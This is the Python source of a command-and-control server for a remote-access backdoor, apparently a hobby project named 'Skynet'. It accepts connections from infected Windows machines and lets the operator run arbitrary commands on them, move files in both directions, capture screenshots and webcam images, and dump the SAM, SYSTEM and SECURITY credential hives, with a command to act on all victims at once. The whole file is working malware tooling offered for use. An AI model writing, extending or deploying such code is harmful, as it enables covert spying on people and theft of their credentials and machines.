#!/usr/bin/env python3

import threading
import hashlib
import ssl
import os
import socket
import signal
import sys
import json
import time
from termcolor import colored

def asciiCode():
    return (colored(""" 
                                                           
 .oooooo..o oooo                                              .   
d8P'    `Y8 `888                                            .o8   
Y88bo.       888  oooo  oooo    ooo ooo. .oo.    .ooooo.  .o888oo 
 `"Y8888o.   888 .8P'    `88.  .8'  `888P"Y88b  d88' `88b   888   
     `"Y88b  888888.      `88..8'    888   888  888ooo888   888   
oo     .d8P  888 `88b.     `888'     888   888  888    .o   888 . 
8""88888P'  o888o o888o     .8'     o888o o888o `Y8bod8P'   "888" 
                        .o..P'                                    
                        `Y8P'                                     

by tay 

    """, 'magenta'))

def backdoorManual():
    (print(colored('''\n
    ======================[ backdoor usage ]======================
                   
    Here are some predefined commands that you can use but you can also use all the windows commands like (dir, mkdir, del...)
    I'm working on adding new good options :)

    General Commands:
    -------------------------------------------------------------------
    quit                      -- Ends connection with target.
    suspend                   -- Pauses session, sends to background.
    cd <dir>                  -- Changes working directory on target.
    upload <file>             -- Uploads a file to the target.
    download <file>           -- Downloads a file from the target.
    get_info                  -- Dumps credential files (SAM, SYSTEM, SECURITY).
    
    Screenshots and Webcam:
    -------------------------------------------------------------------
    screenshot                -- Takes screenshot (stored in ./imgs/sch/).
    webcam                    -- Captures webcam image (stored in ./imgs/web/).
                   
    ===================================================================
    \n''', 'blue')))



def c2Help():
    (print(colored('''\n
    =======[ C2 Manual ]=======
    init                   -- Prints ascii code and the initial info
    sessions               -- Displays active sessions.
    connect <session num>  -- Connects to a specific session.
    cls                    -- Clears terminal screen.
    exit                   -- Closes all sessions & server.
    kill <session num>     -- Terminates specific session.
    sendall <command>      -- Sends command to all sessions.
    \n''', 'blue')))

def receiveData(target):
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except socket.error as e:
            print(colored(f"[!] Socket error: {e}",'red')) 
            return None
        except Exception as e:
            print(colored(f"[!] Unexpected error: {e}", 'red'))
            return None


def sendData(target, data):
    jsondata = json.dumps(data)
    while True:
        try:
            target.send(jsondata.encode())
            break
        except BrokenPipeError:
            break
        except Exception as e:
            print(colored(f"[!] An unexpected error occurred: {e}", 'red'))
            break


def exclWords(command):
    exclWords = ['help', 'clear']
    return any(word in command for word in exclWords)


def fileUp(target, file_name):
    try:
        f = open(file_name, 'rb')
        data = f.read()
        f.close()
    except FileNotFoundError:
        print(colored(f"[!] The file {file_name} does not exist.", 'red'))
        return
    except IOError as e:
        print(colored(f"[!] Error reading from {file_name}: {e}", 'red'))
        return

    try:
        target.send(data)
    except socket.error as e:
        print(colored(f"[!] Error sending data: {e}", 'red'))
        return

    print(colored(f"[+] File {file_name} uploaded successfully.", 'blue'))


def fileDown(target, file_name):
    try:
        f = open(file_name, 'wb')
    except IOError as e:
        print(colored(f"[!] Error opening file {file_name} for writing: {e}", 'red'))
        return

    target.settimeout(2)
    chunk = None
    
    try:
        while True:
            try:
                if chunk is not None:
                    f.write(chunk)
                chunk = target.recv(1024)
            except socket.timeout:
                break
    except socket.error as e:
        print(colored(f"[!] Error receiving data: {e}", 'red'))
    finally:
        f.close()

    target.settimeout(None)

    print(colored(f"[+] File {file_name} downloaded successfully.", 'blue'))


def screenshot(target, count):
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    file_name = f'{SCREENSHOT_DIR}/screenshot_{count}.png'
    try:
        f = open(file_name, 'wb')
    except IOError as e:
        print(colored(f"[!] Error opening file {file_name} for writing: {e}", 'red'))
        return count

    target.settimeout(SCREENSHOT_TIMEOUT)
    chunk = None
    try:
        while True:
            try:
                if chunk is not None:
                    f.write(chunk)
                chunk = target.recv(SCREENSHOT_CHUNK_SIZE)
            except socket.timeout:
                break 
    except socket.error as e:
        print(colored(f"[!] Error receiving data: {e}", 'red'))
    finally:
        f.close()

    target.settimeout(None)
    print(colored(f"[+] Screenshot saved to {file_name}", 'blue'))

    count += 1
    return count


def webcam(target, count):
    os.makedirs(WEBCAM_DIR, exist_ok=True)

    file_name = f'{WEBCAM_DIR}/webcam_pic_{count}.jpg'
    try:
        f = open(file_name, 'wb')
    except IOError as e:
        print(colored(f"[!] Error opening file {file_name} for writing: {e}", 'red'))
        return count

    target.settimeout(WEBCAM_TIMEOUT)
    chunk = None
    try:
        while True:
            try:
                if chunk is not None:
                    f.write(chunk)
                chunk = target.recv(WEBCAM_CHUNK_SIZE)
            except socket.timeout:
                break
    except socket.error as e:
        print(colored(f"[!] Error receiving data: {e}", 'red'))
    finally:
        f.close()

    target.settimeout(None)
    print(colored(f"[+] Webcam image saved to {file_name}", 'blue'))

    return count + 1


def letConnect():
    while True:
        if start_flag == False:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print('\033[34m' + '\n\n[+] The ip: ' + str(ip) + ' has connected' + '\033[0m')
            print(colored('\n>> ','magenta'), end="")
        except:
            pass


def quitAll(targets):
    for target in targets:
        sendData(target, 'quit')
        target.close()


def c2():
    print(colored('\n>> ','magenta'), end="")


def closeTarget(targets, ips, command):
    target_index = int(command[5:])
    target = targets[target_index]
    ip = ips[target_index]
    sendData(target, 'quit')
    target.close()
    targets.remove(target)
    ips.remove(ip)


def sendAll(targets, command):
    target_count = len(targets)
    print(colored(f'[+] Number of sessions {target_count}', 'blue'))
    print(colored('[+] Target sessions', 'blue'))
    i = 0
    try:
        while i < target_count:
            target = targets[i]
            print(target)
            sendData(target, command)
            i += 1
    except Exception as e:
        print(colored(f'[!] Not possible to send the command. Error: {e}', 'red'))

def handleCommandSession(targets, ips, command):
    try:
        session_id = int(command[8:])
        target = targets[session_id]
        ip = ips[session_id]
        targetComms(target, ip)
    except Exception as e:
        print('[!] Session error: ', e)


def handleSamDump(target, command):
    sendData(target, command)
    sam_data, system_data, security_data = receiveData(target)
    if isinstance(sam_data, str):
        print(sam_data)
    else:
        with open('SAM_dump', 'wb') as f:
            f.write(sam_data)
        with open('SYSTEM_dump', 'wb') as f:
            f.write(system_data)
        with open('SECURITY_dump', 'wb') as f:
            f.write(security_data)


def closeAll(targets, sock, t1):
    start_flag = True
    for target in targets:
        sendData(target, 'quit')
        target.close()
    sock.close()
    t1.join()


def listSessions(ips):
    print("\n")
    for counter, ip in enumerate(ips):
        print('\033[34m[+] Session ' + str(counter) + ' --- ' + str(ip) + '\033[0m')
    print("\n")

def cls():
    os.system('clear')


def invalidCommand():
    print(colored('[!] Command not valid', 'red'), end=" > ")
    print(colored('Try typing `help` command', 'red'), end="\n")


def keyboardInterrupt():
    print(colored('\n[+] Please type "exit" to leave', 'red'))


def valueError(e):
    print(colored('[!] ValueError: ','red' + str(e)))


def startSocket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LISTEN_IP, LISTEN_PORT))
    sock.listen(5)
    return sock


def startConnections(sock):
    t1 = threading.Thread(target=letConnect)
    t1.start()
    return t1


def initInfo():
    cls()
    print(asciiCode())
    print(colored('[+] Type "help" for the manual or "exit" to close the socket', 'blue'))
    print(colored(f'[+] Listening in {LISTEN_IP}:{LISTEN_PORT}...', 'blue'))


def joinThread(t1):
    t1.join()


def closeSocket(sock):
    sock.close()
    global start_flag
    start_flag = False


def exitC2(sock, t1):
    closeSocket(sock)
    joinThread(t1)
    print(colored('\n[!] Socket closed', 'red'))

def get_username():
    username = os.getlogin()
    return username

def targetComms(target, ip):
    screenshot_count = 0
    webcam_count = 0
    ip , port = ip

    while True:
        command = input(colored(f'{ip} >> ', 'magenta'))
        sendData(target, command)
        if command == 'quit':
            break
        elif command == 'suspend':
            break
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            fileUp(target, command[7:])
        elif command[:8] == 'download':
            fileDown(target, command[9:])
        elif command[:10] == 'screenshot':
            screenshot(target, screenshot_count)
            screenshot_count += 1
        elif command[:6] == 'webcam':
            webcam(target, webcam_count)
            webcam_count += 1
        elif command[:12] == 'get_info':
            handleSamDump(target, command)
        elif command == 'help':
            backdoorManual()
            pass
        else:
            result = receiveData(target)
            print(result)


def runC2(targets, ips, sock, t1, start_flag):
    while start_flag:
        try:
            command = input(colored('\n>> ', 'magenta'))
            if command == 'sessions':
                listSessions(ips)
            elif command == 'cls':
                cls()
            elif command == 'init':
                initInfo()
            elif command[:7] == 'connect':
                handleCommandSession(targets, ips, command)
            elif command == 'exit':
                quitAll(targets)
                start_flag = exitC2(sock, t1)
            elif command[:4] == 'kill':
                closeTarget(targets, ips, command)
            elif command[:7] == 'sendall':
                sendAll(targets, command)
            elif command[:4] == 'help':
                c2Help()
            else:
                invalidCommand()
        except (KeyboardInterrupt, SystemExit):
            keyboardInterrupt()
        except ValueError as e:
            valueError(e)

global start_flag

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 5555
SCREENSHOT_DIR = 'imgs/sch'
SCREENSHOT_CHUNK_SIZE = 10485760
SCREENSHOT_TIMEOUT = 3

WEBCAM_DIR = './imgs/web'
WEBCAM_CHUNK_SIZE = 10485760
WEBCAM_TIMEOUT = 10

if __name__ == '__main__':
    targets = []
    ips = []
    start_flag = True

    sock = startSocket()
    t1 = startConnections(sock)
    initInfo()

    runC2(targets, ips, sock, t1, start_flag)
